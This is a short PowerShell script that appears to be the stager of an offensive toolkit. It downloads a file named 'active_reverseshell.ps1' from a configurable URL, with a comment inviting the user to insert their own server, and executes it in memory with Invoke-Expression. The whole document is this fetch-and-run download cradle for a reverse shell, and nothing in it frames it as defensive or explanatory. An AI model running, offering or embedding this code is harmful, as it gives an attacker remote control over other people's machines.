# Replace $scriptUrl by yours!

$scriptUrl = "http://127.0.0.1:4812/active_reverseshell.ps1"

$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)

Invoke-Expression -Command $scriptContent
